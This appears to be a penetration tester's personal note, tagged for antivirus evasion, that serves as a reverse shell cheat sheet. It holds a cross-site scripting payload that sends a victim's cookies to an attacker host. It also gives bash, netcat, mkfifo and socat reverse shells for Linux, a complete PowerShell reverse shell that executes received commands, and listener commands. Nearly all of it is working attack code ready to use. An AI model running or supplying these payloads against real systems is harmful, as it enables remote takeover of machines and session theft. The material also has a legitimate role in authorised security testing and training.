---
tags:
  - av-evasion
---
[All-in-one resource](https://www.revshells.com/) 
[Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

HTTP:
```http
<img src=x onerror=fetch('http://IP:PORT/'+document.cookie);>
```

### Linux:
```bash
bash -c 'exec bash -i &>/dev/tcp/IP/PORT <&1'

nc -e /bin/sh IP PORT

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:PORT
```

> The #pseudo-terminals  let’s you spawn a pseudo-terminal that can fool commands like `su` into thinking they are being executed in a proper terminal.

### Windows
```powershell
> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
# Listen

```Shell
$ socat file:`tty`,raw,echo=0 tcp-listen:PORT
$ nc -nlvp PORT
```

Once we get a shell, we can try to [[Upgrade Shell]]